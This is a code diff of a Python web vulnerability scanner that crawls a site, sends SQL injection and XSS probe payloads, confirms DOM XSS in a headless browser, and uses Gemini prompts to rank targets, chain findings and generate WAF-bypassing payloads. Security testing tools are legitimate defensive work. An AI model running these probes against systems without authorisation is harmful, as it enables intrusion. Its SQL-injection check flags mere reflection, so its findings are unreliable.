-==================== FILE: scanner\active_engine.py ====================
-
-import asyncio
-import httpx
-import time
-import logging
-
-from scanner.crawler import Crawler
-from scanner.dast.param_engine import ParamEngine
-from scanner.detector import Detector
-from scanner.auth_handler import AuthHandler
-from scanner.dast.priority_engine import PriorityEngine
-from scanner.learning_engine import LearningEngine
-from scanner.ai_brain import AIBrain
-
-logging.basicConfig(level=logging.INFO)
-
-
-class ActiveScanner:
-    def __init__(self):
-        self.param_engine = ParamEngine()
-        self.detector = Detector()
-        self.auth = AuthHandler()
-        self.priority = PriorityEngine()
-        self.learning = LearningEngine()
-        self.brain = AIBrain()
-
-        # -------------------------
-        # PAYLOAD ENGINE (SMART)
-        # -------------------------
-        self.payload_variants = [
-            "' OR '1'='1",
-            "' OR 1=1--",
-            "\" OR \"1\"=\"1",
-            "' OR 'a'='a"
-        ]
-
-        self.xss_payloads = [
-            "<script>alert(1)</script>",
-            "\"><script>alert(1)</script>",
-            "<img src=x onerror=alert(1)>"
-        ]
-
-        self.common_params = ["id", "q", "search", "page", "cat"]
-
-        # -------------------------
-        # CONTROL LIMITS
-        # -------------------------
-        self.semaphore = asyncio.Semaphore(10)
-        self.max_requests = 300
-        self.request_count = 0
-
-    # -------------------------
-    # SAFE REQUEST
-    # -------------------------
-    async def safe_request(self, client, method, url, **kwargs):
-        if self.request_count >= self.max_requests:
-            return None
-
-        self.request_count += 1
-
-        try:
-            if method == "GET":
-                return await client.get(url, **kwargs)
-            elif method == "POST":
-                return await client.post(url, **kwargs)
-        except Exception as e:
-            logging.error(f"[REQUEST ERROR] {url} -> {e}")
-            return None
-
-    # -------------------------
-    # MAIN SCAN
-    # -------------------------
-    async def scan(self, base_url, auth_config=None):
-        findings = []
-        tasks = []
-
-        async with httpx.AsyncClient(timeout=15, verify=False, follow_redirects=True) as client:
-
-            # AUTH
-            if auth_config:
-                logging.info("[AUTH] Attempting authentication")
-
-                if auth_config.get("type") == "login":
-                    await self.auth.login(
-                        client,
-                        auth_config["login_url"],
-                        auth_config["username"],
-                        auth_config["password"]
-                    )
-
-                elif auth_config.get("type") == "cookie":
-                    self.auth.inject_cookies(client, auth_config["cookies"])
-
-            # CRAWL
-            crawler = Crawler(base_url)
-            endpoints, forms = await crawler.crawl(client)
-
-            logging.info(f"[CRAWL] Found {len(endpoints)} endpoints")
-
-            # -------------------------
-            # SMART PRIORITIZATION (LEARNING BOOST)
-            # -------------------------
-            scored = []
-
-            for ep in endpoints:
-                base = self.priority.score_endpoint(ep)
-                learned = self.learning.get_priority_boost(ep)
-                scored.append((ep, base + learned))
-
-            scored.sort(key=lambda x: x[1], reverse=True)
-            prioritized_endpoints = await self.brain.prioritize_targets(list(endpoints))
-
-            # -------------------------
-            # TESTING
-            # -------------------------
-            for url in prioritized_endpoints:
-                params = self.param_engine.extract_params(url) or self.common_params
-
-                for param in params:
-                    tasks.append(self.safe_task(self.test_sqli, client, url, param))
-                    tasks.append(self.safe_task(self.test_xss, client, url, param))
-
-            for form in forms:
-                tasks.append(self.safe_task(self.test_form, client, form))
-
-            results = await asyncio.gather(*tasks)
-
-            # COLLECT
-            for r in results:
-                if r:
-                    if isinstance(r, list):
-                        findings.extend(r)
-                    else:
-                        findings.append(r)
-
-        # -------------------------
-        # LEARNING LOOP
-        # -------------------------
-        validated = []
-
-        for f in findings:
-            ai_result = await self.brain.validate_finding(f)
-
-            if ai_result.get("valid"):
-                f["confidence"] = ai_result.get("confidence", 0.7)
-                f["ai_reason"] = ai_result.get("reason")
-                f["severity"] = ai_result.get("severity", f.get("severity"))
-
-                validated.append(f)
-                self.learning.record_finding(f)
-
-        findings = validated
-
-        logging.info(f"[SCAN COMPLETE] Found {len(findings)} issues")
-        return findings
-
-    async def safe_task(self, func, *args):
-        async with self.semaphore:
-            return await func(*args)
-
-    # -------------------------
-    # SQLi (MULTI-PAYLOAD + VALIDATION)
-    # -------------------------
-    async def test_sqli(self, client, url, param):
-        ai_payloads = await self.brain.generate_payloads({
-            "url": url,
-            "param": param
-        })
-
-        all_payloads = self.payload_variants + ai_payloads
-        try:
-            baseline = await self.safe_request(client, "GET", url)
-            if not baseline:
-                return None
-
-            for payload in all_payloads:
-                test_url = self.param_engine.inject_payload(url, param, payload)
-                res = await self.safe_request(client, "GET", test_url)
-
-                if not res:
-                    continue
-
-                # SIGNAL DETECTION
-                if payload in res.text:
-
-                    # DOUBLE VALIDATION
-                    confirm = await self.safe_request(client, "GET", test_url)
-
-                    if confirm and confirm.text == res.text:
-                        return {
-                            "type": "SQL Injection",
-                            "url": test_url,
-                            "parameter": param,
-                            "payload": payload,
-                            "severity": "Critical",
-                            "confidence": 0.9,
-                            "evidence": payload
-                        }
-
-        except Exception as e:
-            logging.error(f"[SQLi ERROR] {url} -> {e}")
-
-        return None
-
-    # -------------------------
-    # XSS (CONTEXT-AWARE)
-    # -------------------------
-    async def test_xss(self, client, url, param):
-        results = []
-
-        for payload in self.xss_payloads:
-            try:
-                test_url = self.param_engine.inject_payload(url, param, payload)
-                res = await self.safe_request(client, "GET", test_url)
-
-                if not res:
-                    continue
-
-                if payload in res.text:
-
-                    if "<script>" in res.text or "onerror" in res.text:
-                        severity = "Critical"
-                    else:
-                        severity = "High"
-
-                    finding = {
-                        "type": "Cross-Site Scripting (XSS)",
-                        "url": test_url,
-                        "parameter": param,
-                        "payload": payload,
-                        "severity": severity,
-                        "confidence": 0.8,
-                        "evidence": payload
-                    }
-
-                    results.append(finding)
-
-            except Exception as e:
-                logging.error(f"[XSS ERROR] {url} -> {e}")
-
-        return results if results else None
-
-    # -------------------------
-    # FORM TESTING
-    # -------------------------
-    async def test_form(self, client, form):
-        results = []
-
-        for payload in self.xss_payloads:
-            data = {i: payload for i in form["inputs"]}
-
-            try:
-                if form["method"].lower() == "post":
-                    res = await self.safe_request(client, "POST", form["url"], data=data)
-                else:
-                    res = await self.safe_request(client, "GET", form["url"], params=data)
-
-                if not res:
-                    continue
-
-                if payload in res.text:
-                    results.append({
-                        "type": "Form XSS",
-                        "url": form["url"],
-                        "payload": payload,
-                        "severity": "High",
-                        "confidence": 0.75,
-                        "evidence": payload
-                    })
-
-            except Exception as e:
-                logging.error(f"[FORM ERROR] {form['url']} -> {e}")
-
-        return results if results else None
-
-
 ==================== FILE: scanner\ai_brain.py ====================
+
+# scanner/ai_brain.py
+#
+# PLACEMENT: Replace scanner/ai_brain.py entirely.
+#
+# WHAT CHANGED:
+#   • Added detect_technology() — identifies CMS/framework from homepage HTML
+#     so active_scanner can load targeted payload sets
+#   • validate_finding() unchanged — still the main AI quality gate
+#   • generate_payloads() kept but marked as unused in hot path
+#     (static payloads in payloads.py are faster and more reliable)
+#   • analyze_attack_chain() and prioritize_targets() unchanged
 
 import os
 import json
 import asyncio
+import logging
 import google.generativeai as genai
 from dotenv import load_dotenv
 
 load_dotenv()
+logger = logging.getLogger(__name__)
+
+
+def _safe_parse(text: str) -> dict | None:
+    try:
+        s = text.find("{")
+        e = text.rfind("}")
+        if s >= 0 and e >= 0:
+            return json.loads(text[s:e+1])
+    except Exception:
+        pass
+    return None
 
 
 class AIBrain:
+
     def __init__(self):
         api_key = os.getenv("GEMINI_API_KEY")
-        genai.configure(api_key=api_key)
-        self.model = genai.GenerativeModel("gemini-1.5-flash")
+        if not api_key:
+            logger.warning("[AIBrain] GEMINI_API_KEY not set — AI features disabled")
+        genai.configure(api_key=api_key or "")
+        self.model   = genai.GenerativeModel("gemini-1.5-flash")
+        self.enabled = bool(api_key)
+
+    async def _call(self, prompt: str) -> str | None:
+        if not self.enabled:
+            return None
+        try:
+            res = await asyncio.to_thread(self.model.generate_content, prompt)
+            return res.text.strip()
+        except Exception as e:
+            logger.warning(f"[AIBrain] API call failed: {e}")
+            return None
 
     # ── Validate Finding ────────────────────────────────────────────────────
-    async def validate_finding(self, finding) -> dict:
-        prompt = f"""
-        You are a senior penetration tester.
-
-        Analyze this finding:
-        {json.dumps(finding, indent=2)}
-
-        Answer STRICTLY in JSON:
-        {{
-          "valid": true/false,
-          "confidence": 0.0-1.0,
-          "reason": "short explanation",
-          "severity": "Low/Medium/High/Critical"
-        }}
+    async def validate_finding(self, finding: dict) -> dict:
         """
-        try:
-            res = await asyncio.to_thread(self.model.generate_content, prompt)
-            text = res.text.strip()
-            if "{" in text:
-                text = text[text.find("{"):text.rfind("}") + 1]
-            return json.loads(text)
-        except Exception as e:
-            return {
-                "valid": True,
-                "confidence": 0.5,
-                "reason": f"AI error: {str(e)}",
-                "severity": finding.get("severity", "Medium"),
-            }
-
-    # ── Generate Smart Payloads ─────────────────────────────────────────────
-    async def generate_payloads(self, context) -> list:
-        prompt = f"""
-        You are an advanced exploit developer.
-
-        Target context:
-        {context}
-
-        Generate 5 advanced payloads for SQL Injection OR XSS.
-
-        Return JSON:
-        {{
-          "payloads": ["...", "..."]
-        }}
+        Given a raw scanner finding, ask the AI whether it is a real
+        vulnerability or a false positive, and what the true severity is.
+        Used in filter_false_positives() in active_scanner.py.
         """
-        try:
-            res = await asyncio.to_thread(self.model.generate_content, prompt)
-            text = res.text.strip()
-            if "{" in text:
-                text = text[text.find("{"):text.rfind("}") + 1]
-            return json.loads(text).get("payloads", [])
-        except Exception:
-            return []
+        prompt = f"""
+You are a senior web application penetration tester.
+
+Analyse this scanner finding and determine if it is a real vulnerability
+or a false positive. Consider the evidence carefully.
+
+FINDING:
+{json.dumps(finding, indent=2)}
+
+Answer STRICTLY in JSON — no markdown, no explanation outside the JSON:
+{{
+  "valid": true or false,
+  "confidence": 0.0 to 1.0,
+  "reason": "one sentence explanation",
+  "severity": "Low" or "Medium" or "High" or "Critical"
+}}
+"""
+        text = await self._call(prompt)
+        if not text:
+            return {"valid": True, "confidence": 0.5, "reason": "AI unavailable",
+                    "severity": finding.get("severity", "Medium")}
+        parsed = _safe_parse(text)
+        return parsed if parsed else {
+            "valid": True, "confidence": 0.5,
+            "reason": "parse error", "severity": finding.get("severity", "Medium"),
+        }
+
+    # ── Detect Technology  (NEW) ────────────────────────────────────────────
+    async def detect_technology(self, homepage_html: str, headers: dict) -> dict:
+        """
+        Analyse the homepage HTML + response headers to identify the tech stack.
+        Returns a dict that active_scanner can use to load targeted payloads.
+
+        Example return value:
+        {
+            "cms":       "WordPress",
+            "framework": "PHP",
+            "server":    "Apache",
+            "database":  "MySQL",
+            "notes":     "wp-content paths visible, X-Powered-By: PHP/8.1"
+        }
+
+        Call this at the start of scan() and pass result to payload selection.
+        """
+        prompt = f"""
+You are a web technology fingerprinting expert.
+
+Analyse the following HTTP response data and identify the technology stack.
+
+RESPONSE HEADERS:
+{json.dumps(headers, indent=2)}
+
+HTML SNIPPET (first 3000 chars):
+{homepage_html[:3000]}
+
+Return ONLY valid JSON — no markdown:
+{{
+  "cms":       "WordPress | Drupal | Joomla | Laravel | Django | Rails | Spring | Next.js | Unknown",
+  "framework": "PHP | Python | Ruby | Java | Node.js | .NET | Unknown",
+  "server":    "Apache | Nginx | IIS | Caddy | Unknown",
+  "database":  "MySQL | PostgreSQL | MSSQL | Oracle | MongoDB | Unknown",
+  "notes":     "any additional clues (version numbers, specific paths, etc.)"
+}}
+"""
+        text = await self._call(prompt)
+        if not text:
+            return {"cms": "Unknown", "framework": "Unknown",
+                    "server": "Unknown", "database": "Unknown", "notes": ""}
+        parsed = _safe_parse(text)
+        return parsed if parsed else {
+            "cms": "Unknown", "framework": "Unknown",
+            "server": "Unknown", "database": "Unknown", "notes": str(text)[:200],
+        }
 
     # ── Analyze Attack Chain ────────────────────────────────────────────────
-    async def analyze_attack_chain(self, findings) -> dict:
+    async def analyze_attack_chain(self, findings: list) -> dict:
         prompt = f"""
-        You are an elite penetration tester.
+You are an elite penetration tester. These vulnerabilities were confirmed on a target:
 
-        These vulnerabilities were found:
-        {json.dumps(findings, indent=2)}
+{json.dumps(findings, indent=2)}
 
-        Identify REAL attack chains.
+Identify realistic multi-step attack chains. Describe how an attacker
+would chain these findings to achieve maximum impact.
 
-        Return JSON:
-        {{
-          "chains": [
-            {{
-              "steps": ["XSS", "Session Hijack", "Admin Access"],
-              "impact": "Full account takeover",
-              "severity": "Critical"
-            }}
-          ]
-        }}
-        """
-        try:
-            res = await asyncio.to_thread(self.model.generate_content, prompt)
-            text = res.text.strip()
-            if "{" in text:
-                text = text[text.find("{"):text.rfind("}") + 1]
-            return json.loads(text)
-        except Exception:
-            return {"chains": []}
+Return ONLY valid JSON:
+{{
+  "chains": [
+    {{
+      "steps":  ["Step 1: ...", "Step 2: ...", "Step 3: ..."],
+      "impact": "Full account takeover / Data exfiltration / RCE / etc.",
+      "severity": "Critical | High | Medium"
+    }}
+  ],
+  "worst_case": "One sentence describing the worst realistic outcome"
+}}
+"""
+        text = await self._call(prompt)
+        if not text:
+            return {"chains": [], "worst_case": ""}
+        parsed = _safe_parse(text)
+        return parsed if parsed else {"chains": [], "worst_case": ""}
 
     # ── Prioritize Targets ──────────────────────────────────────────────────
-    async def prioritize_targets(self, endpoints) -> list:
-        prompt = f"""
-        You are a web security expert.
-
-        Rank these endpoints by likelihood of vulnerability:
-        {json.dumps(endpoints[:50], indent=2)}
-
-        Return JSON:
-        {{
-          "priority": ["url1", "url2"]
-        }}
-        """
-        try:
-            res = await asyncio.to_thread(self.model.generate_content, prompt)
-            text = res.text.strip()
-            if "{" in text:
-                text = text[text.find("{"):text.rfind("}") + 1]
-            return json.loads(text).get("priority", endpoints)
-        except Exception:
+    async def prioritize_targets(self, endpoints: list) -> list:
+        if not endpoints:
             return endpoints
+        prompt = f"""
+You are a web security expert. Rank these endpoints by their likelihood
+of containing vulnerabilities (highest risk first).
+
+Consider: auth paths, file params, admin panels, search, IDs in paths.
+
+ENDPOINTS:
+{json.dumps(endpoints[:60], indent=2)}
+
+Return ONLY valid JSON:
+{{"priority": ["url1", "url2", "...all urls ranked..."]}}
+"""
+        text = await self._call(prompt)
+        if not text:
+            return endpoints
+        parsed = _safe_parse(text)
+        return parsed.get("priority", endpoints) if parsed else endpoints
+
+    # ── Generate Payloads (REFERENCE ONLY — not in hot path) ───────────────
+    async def generate_payloads(self, context: dict) -> list:
+        """
+        NOT called during scanning — static payloads.py is faster and better.
+        Kept here for experimental use or one-off targeted tests.
+        """
+        prompt = f"""
+Target context: {json.dumps(context)}
+Generate 5 advanced, WAF-bypassing payloads for the vulnerability type indicated.
+Return ONLY JSON: {{"payloads": ["...", "..."]}}
+"""
+        text = await self._call(prompt)
+        if not text:
+            return []
+        parsed = _safe_parse(text)
+        return parsed.get("payloads", []) if parsed else []
 
 
 ==================== FILE: scanner\auth_handler.py ====================
@@ -1527,208 +1346,6 @@ class AuthHandler:
             client.cookies.set(k, v)
 
         logging.info("[AUTH] Cookies injected")
-
-==================== FILE: scanner\chain_analyzer.py ====================
-
-class ChainAnalyzer:
-
-    def find_paths(self, graph, max_depth=3):
-        paths = []
-
-        for start in graph:
-            self._dfs(graph, start, [], paths, max_depth)
-
-        return paths
-
-    def _dfs(self, graph, current, path, paths, depth):
-        if depth == 0:
-            return
-
-        path = path + [current]
-
-        if not graph[current]["edges"]:
-            if len(path) > 1:
-                paths.append(path)
-            return
-
-        for edge in graph[current]["edges"]:
-            self._dfs(graph, edge["to"], path, paths, depth - 1)
-
-==================== FILE: scanner\crawler.py ====================
-
-# scanner/crawler.py
-
-import logging
-from urllib.parse import urljoin, urlparse
-import httpx
-from bs4 import BeautifulSoup
-from scanner.js_parser import JSParser
-
-class Crawler:
-    def __init__(self, base_url, max_pages=50, max_depth=3):
-        self.base_url = base_url
-        self.visited = set()
-        self.endpoints = set()
-        self.forms = []
-        self.max_pages = max_pages
-        self.max_depth = max_depth
-        self.depth_map = {}
-
-        self.js_parser = JSParser()
-
-    # -----------------------
-    # FILTER USELESS FILES
-    # -----------------------
-    def is_valid(self, url):
-        blocked_ext = [".jpg", ".png", ".css", ".svg", ".woff", ".ico", ".pdf"]
-        return not any(url.lower().endswith(ext) for ext in blocked_ext)
-
-    def is_internal(self, url):
-        return urlparse(url).netloc == urlparse(self.base_url).netloc
-
-    # -----------------------
-    # JS PARSING
-    # -----------------------
-    async def extract_js(self, client, soup, current_url):
-        js_endpoints = set()
-        scripts = soup.find_all("script", src=True)
-
-        for script in scripts:
-            js_url = urljoin(self.base_url, script["src"])
-
-            try:
-                logging.info(f"[JS] Fetching: {js_url}")
-
-                res = await client.get(js_url, timeout=10)
-
-                found = self.js_parser.extract_endpoints(
-                    res.text, self.base_url
-                )
-
-                if found:
-                    logging.info(f"[JS] Found {len(found)} endpoints")
-
-                js_endpoints.update(found)
-
-            except Exception as e:
-                logging.error(f"[JS ERROR] {e}")
-
-        return js_endpoints
-
-    # -----------------------
-    # MAIN CRAWL LOOP
-    # -----------------------
-    async def crawl(self, client, url=None, depth=0):
-        if url is None:
-            url = self.base_url
-
-        # LIMITS
-        if (
-            url in self.visited or
-            len(self.visited) >= self.max_pages or
-            depth > self.max_depth or
-            not self.is_valid(url)
-        ):
-            return self.endpoints, self.forms
-
-        self.visited.add(url)
-        self.depth_map[url] = depth
-
-        logging.info(f"[CRAWL] Visiting ({depth}): {url}")
-
-        try:
-            res = await client.get(url, timeout=10)
-            soup = BeautifulSoup(res.text, "html.parser")
-
-            # ADD CURRENT URL
-            self.endpoints.add(url)
-
-            # -----------------------
-            # JS DISCOVERY
-            # -----------------------
-            js_endpoints = await self.extract_js(client, soup, url)
-
-            for ep in js_endpoints:
-                if self.is_internal(ep) and self.is_valid(ep):
-                    self.endpoints.add(ep)
-
-            # -----------------------
-            # COMMON HIDDEN PATHS
-            # -----------------------
-            common_paths = [
-                "/api/",
-                "/api/v1/",
-                "/admin/",
-                "/login.php",
-                "/search.php",
-                "/dashboard/",
-                "/user/"
-            ]
-
-            for path in common_paths:
-                self.endpoints.add(urljoin(self.base_url, path))
-
-            # -----------------------
-            # LINK DISCOVERY
-            # -----------------------
-            for link in soup.find_all("a", href=True):
-                full = urljoin(self.base_url, link["href"])
-
-                if self.is_internal(full) and self.is_valid(full):
-                    await self.crawl(client, full, depth + 1)
-
-            # -----------------------
-            # FORM DISCOVERY
-            # -----------------------
-            for form in soup.find_all("form"):
-                action = form.get("action") or url
-                method = form.get("method", "get").lower()
-
-                inputs = list(set([
-                    inp.get("name")
-                    for inp in form.find_all(["input", "textarea"])
-                    if inp.get("name")
-                ]))
-
-                form_obj = {
-                    "url": urljoin(self.base_url, action),
-                    "method": method,
-                    "inputs": inputs
-                }
-
-                if form_obj not in self.forms:
-                    self.forms.append(form_obj)
-
-        except Exception as e:
-            logging.error(f"[CRAWL ERROR] {url}: {e}")
-
-        return self.endpoints, self.forms
-
-==================== FILE: scanner\cvss.py ====================
-
-# scanner/cvss.py
-
-class CVSS:
-
-    def calculate(self, vuln_type):
-        base_scores = {
-            "SQL Injection": 9.8,
-            "XSS": 6.1,
-            "DOM XSS": 7.5,
-            "Form Issue": 5.0
-        }
-
-        return base_scores.get(vuln_type, 4.0)
-
-    def severity_label(self, score):
-        if score >= 9:
-            return "Critical"
-        elif score >= 7:
-            return "High"
-        elif score >= 4:
-            return "Medium"
-        else:
-            return "Low"
 
 ==================== FILE: scanner\detector.py ====================
 
@@ -1828,60 +1445,6 @@ class JSParser:
 
         return found
 
-==================== FILE: scanner\learning_engine.py ====================
-
-import json
-import os
-
-class LearningEngine:
-    def __init__(self, path="learning.json"):
-        self.path = path
-        self.data = self.load()
-
-    def load(self):
-        if os.path.exists(self.path):
-            with open(self.path, "r") as f:
-                return json.load(f)
-        return {
-            "vulnerable_params": {},
-            "high_risk_paths": {},
-            "successful_payloads": {}
-        }
-
-    def save(self):
-        with open(self.path, "w") as f:
-            json.dump(self.data, f, indent=2)
-
-    def record_finding(self, finding):
-        param = finding.get("parameter")
-        url = finding.get("url", "")
-        payload = finding.get("payload")
-
-        if param:
-            self.data["vulnerable_params"][param] = \
-                self.data["vulnerable_params"].get(param, 0) + 1
-
-        if url:
-            for key in ["admin", "login", "api"]:
-                if key in url:
-                    self.data["high_risk_paths"][key] = \
-                        self.data["high_risk_paths"].get(key, 0) + 1
-
-        if payload:
-            self.data["successful_payloads"][payload] = \
-                self.data["successful_payloads"].get(payload, 0) + 1
-
-        self.save()
-
-    def get_priority_boost(self, url):
-        score = 0
-
-        for key, count in self.data["high_risk_paths"].items():
-            if key in url:
-                score += count
-
-        return score
-
 ==================== FILE: scanner\report_builder.py ====================
 
 from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer
@@ -1938,92 +1501,48 @@ class ReportBuilder:
         doc.build(elements)
         return path
 
-==================== FILE: scanner\safety.py ====================
-
-# scanner/safety.py
-
-import requests
-import ssl
-import socket
-from urllib.parse import urlparse
-
-
-class SafetyAuditor:
-    def __init__(self, url):
-        self.url = url
-        parsed = urlparse(url)
-        self.hostname = parsed.netloc
-
-    # -----------------------
-    # SECURITY HEADERS CHECK
-    # -----------------------
-    def audit_headers(self):
-        required_headers = [
-            "Content-Security-Policy",
-            "Strict-Transport-Security",
-            "X-Frame-Options"
-        ]
-
-        try:
-            res = requests.get(self.url, timeout=5)
-
-            report = {
-                h: res.headers.get(h, "MISSING")
-                for h in required_headers
-            }
-
-            return report
-
-        except Exception as e:
-            return {"error": str(e)}
-
-    # -----------------------
-    # SSL CHECK
-    # -----------------------
-    def check_ssl(self):
-        try:
-            context = ssl.create_default_context()
-
-            with socket.create_connection((self.hostname, 443), timeout=5) as sock:
-                with context.wrap_socket(sock, server_hostname=self.hostname) as ssock:
-                    cert = ssock.getpeercert()
-
-                    return {
-                        "status": "Valid",
-                        "issuer": cert.get('issuer'),
-                        "subject": cert.get('subject')
-                    }
-
-        except Exception as e:
-            return {
-                "status": "Issue Detected",
-                "details": str(e)
-            }
-
 ==================== FILE: scanner\safety_guard.py ====================
 
+# scanner/safety_guard.py
 from urllib.parse import urlparse
 
 class SafetyGuard:
 
     def __init__(self):
-        self.blocked_keywords = [
-            "bank",
-            "paypal",
-            "government",
-            "login.microsoft",
-            "facebook"
-        ]
+        # Using a set for O(1) lookup speed and exact matching
+        self.BLOCKED_DOMAINS = {
+            "paypal.com", 
+            "login.microsoft.com", 
+            "facebook.com",
+            "google.com", 
+            "apple.com", 
+            "amazon.com",
+            "chase.com",
+            "bankofamerica.com"
+        }
 
     def is_allowed(self, url):
-        parsed = urlparse(url)
-        domain = parsed.netloc.lower()
+        """
+        Verifies if a URL is safe to scan.
+        Prevents accidental scanning of major platforms or financial institutions.
+        """
+        try:
+            parsed = urlparse(url)
+            # Extract domain and normalize
+            domain = parsed.netloc.lower()
+            
+            # Remove 'www.' prefix if present for consistent matching
+            if domain.startswith("www."):
+                domain = domain[4:]
 
-        for keyword in self.blocked_keywords:
-            if keyword in domain:
+            # Exact match check
+            if domain in self.BLOCKED_DOMAINS:
                 return False
 
-        return True
+            return True
+        except Exception:
+            # If URL is malformed, block it by default
+            return False
 
 ==================== FILE: scanner\sast_engine.py ====================
 
@@ -2987,215 +2506,1702 @@ class APIEngine:
 
 ==================== FILE: scanner\browser\playwright_engine.py ====================
 
+# scanner/browser/playwright_engine.py
+#
+# PLACEMENT: Replace scanner/browser/playwright_engine.py entirely.
+#
+# WHAT CHANGED:
+#   • DOM XSS now uses page.on("dialog") — catches actual alert() execution
+#   • SPA crawling via crawl_spa() — clicks nav links, intercepts network requests
+#   • Param-aware injection — tests all params found in the URL, not just "?q="
+#   • Content Security Policy bypass detection
+#   • Proper browser cleanup with try/finally
+
 import asyncio
 import logging
+from urllib.parse import urlparse, urlencode, parse_qs, urlunparse
+
+logger = logging.getLogger(__name__)
 
 try:
-    from playwright.async_api import async_playwright
+    from playwright.async_api import async_playwright, Dialog
     PLAYWRIGHT_AVAILABLE = True
 except ImportError:
     PLAYWRIGHT_AVAILABLE = False
-    logging.warning("[PLAYWRIGHT] playwright not installed. Browser scanning disabled.")
+    logger.warning("[PLAYWRIGHT] Not installed — browser scanning disabled. Run: pip install playwright && playwright install chromium")
+
+# XSS payloads that trigger alert() if executed in a browser context
+DOM_XSS_PAYLOADS = [
+    "<script>alert(1)</script>",
+    "<img src=x onerror=alert(1)>",
+    "<svg onload=alert(1)>",
+    "\"><script>alert(1)</script>",
+    "'><img src=x onerror=alert(1)>",
+    "<details open ontoggle=alert(1)>",
+    "<input autofocus onfocus=alert(1)>",
+    "javascript:alert(1)",
+    "<iframe src=javascript:alert(1)>",
+    "<body onload=alert(1)>",
+]
 
 
 class PlaywrightScanner:
-    """
-    Headless browser scanner for DOM-based XSS and JS-rendered content.
-    """
 
     def __init__(self):
-        self.xss_payloads = [
-            "<script>alert(1)</script>",
-            "\"><script>alert(1)</script>",
-            "<img src=x onerror=alert(1)>",
-        ]
+        self.timeout_nav    = 20_000   # ms — page navigation
+        self.timeout_wait   = 10_000   # ms — goto during XSS testing
+        self.timeout_settle = 1_500    # ms — wait for JS to settle after load
 
-    async def scan(self, url):
-        """
-        Returns (findings, endpoints) tuple.
-        findings: list of vulnerability dicts
-        endpoints: list of discovered URLs
-        """
+    # ─────────────────────────────────────────────────────────────────────────
+    # MAIN ENTRY POINT  (called from browser_worker.py)
+    # Returns (findings, endpoints)
+    # ─────────────────────────────────────────────────────────────────────────
+    async def scan(self, url: str) -> tuple[list, list]:
         if not PLAYWRIGHT_AVAILABLE:
-            logging.warning("[PLAYWRIGHT] Skipping browser scan - playwright not available.")
             return [], []
 
-        findings = []
+        findings  = []
         endpoints = set()
 
         try:
             async with async_playwright() as p:
-                browser = await p.chromium.launch(headless=True)
-                page = await browser.new_page()
-
-                await page.goto(url, timeout=15000)
-
-                # Collect all links visible after JS renders
-                links = await page.eval_on_selector_all(
-                    "a[href]",
-                    "els => els.map(e => e.href)"
+                browser = await p.chromium.launch(
+                    headless=True,
+                    args=["--no-sandbox", "--disable-setuid-sandbox",
+                          "--disable-dev-shm-usage"],
                 )
-                endpoints.update(links)
+                context = await browser.new_context(
+                    ignore_https_errors=True,
+                    java_script_enabled=True,
+                    viewport={"width": 1280, "height": 800},
+                )
 
-                # Test XSS via URL param injection
-                for payload in self.xss_payloads:
-                    test_url = f"{url}?q={payload}"
-                    try:
-                        await page.goto(test_url, timeout=10000)
-                        content = await page.content()
-                        if payload in content:
-                            findings.append({
-                                "type": "DOM XSS",
-                                "url": test_url,
-                                "payload": payload,
-                                "severity": "High",
-                                "confidence": 0.75,
-                                "evidence": payload
-                            })
-                    except Exception:
-                        pass
+                try:
+                    # Run DOM XSS scan and SPA crawl concurrently
+                    xss_findings, xss_endpoints = await self._scan_dom_xss(context, url)
+                    spa_endpoints               = await self._crawl_spa(context, url)
 
-                await browser.close()
+                    findings.extend(xss_findings)
+                    endpoints.update(xss_endpoints)
+                    endpoints.update(spa_endpoints)
+
+                finally:
+                    await context.close()
+                    await browser.close()
 
         except Exception as e:
-            logging.error(f"[PLAYWRIGHT ERROR] {url} -> {e}")
+            logger.error(f"[PLAYWRIGHT] Fatal error for {url}: {e}")
 
         return findings, list(endpoints)
 
+    # ─────────────────────────────────────────────────────────────────────────
+    # DOM XSS — alert()-based confirmed execution
+    # ─────────────────────────────────────────────────────────────────────────
+    async def _scan_dom_xss(self, context, base_url: str) -> tuple[list, set]:
+        """
+        Navigate to the target and inject XSS payloads into every URL param.
+        Uses page.on("dialog") to catch actual alert() / confirm() / prompt()
+        execution — this is CONFIRMED execution, not just reflection.
+        """
+        findings  = []
+        endpoints = set()
+        page      = await context.new_page()
+
+        # Collect all links that render after JS executes
+        try:
+            await page.goto(base_url, timeout=self.timeout_nav, wait_until="networkidle")
+            await page.wait_for_timeout(self.timeout_settle)
+
+            links = await page.eval_on_selector_all(
+                "a[href]", "els => els.map(e => e.href)"
+            )
+            endpoints.update(l for l in links if l.startswith("http"))
+
+        except Exception as e:
+            logger.warning(f"[PLAYWRIGHT] Initial load failed for {base_url}: {e}")
+            await page.close()
+            return findings, endpoints
+
+        current_url = page.url
+
+        # Extract all params present in the URL after JS renders
+        parsed_params = list(parse_qs(urlparse(current_url).query).keys())
+        # Always also test some common param names
+        all_params = list(set(parsed_params + ["q", "search", "id", "page", "query", "s"]))
+
+        for param in all_params:
+            for payload in DOM_XSS_PAYLOADS:
+                # Track whether alert() fires
+                dialog_fired  = []
+                dialog_handle = None
+
+                async def on_dialog(dialog: Dialog, p=payload):
+                    dialog_fired.append(dialog.message)
+                    await dialog.dismiss()
+
+                page.on("dialog", on_dialog)
+
+                # Build the test URL
+                parsed      = urlparse(current_url)
+                query_dict  = parse_qs(parsed.query, keep_blank_values=True)
+                query_dict[param] = [payload]
+                test_url    = urlunparse(parsed._replace(
+                    query=urlencode(query_dict, doseq=True)
+                ))
+
+                try:
+                    await page.goto(test_url, timeout=self.timeout_wait,
+                                    wait_until="domcontentloaded")
+                    await page.wait_for_timeout(self.timeout_settle)
+
+                    if dialog_fired:
+                        # alert() actually executed — this is a CONFIRMED DOM XSS
+                        findings.append({
+                            "type":        "Cross-Site Scripting (XSS)",
+                            "subtype":     "DOM XSS — Confirmed Execution",
+                            "url":         test_url,
+                            "parameter":   param,
+                            "payload":     payload,
+                            "severity":    "Critical",
+                            "confidence":  0.99,
+                            "evidence":    f"alert() fired with: '{dialog_fired[0]}'",
+                            "description": (
+                                f"Parameter '{param}' executes arbitrary JavaScript in the browser. "
+                                f"The DOM XSS was confirmed by intercepting the alert() call. "
+                                f"An attacker can steal cookies, hijack sessions, or redirect users."
+                            ),
+                        })
+                        logger.info(f"[PLAYWRIGHT] DOM XSS CONFIRMED: {test_url}")
+                        # Confirmed — skip remaining payloads for this param
+                        page.remove_listener("dialog", on_dialog)
+                        break
+
+                except Exception:
+                    pass
+                finally:
+                    page.remove_listener("dialog", on_dialog)
+
+        await page.close()
+        return findings, endpoints
+
+    # ─────────────────────────────────────────────────────────────────────────
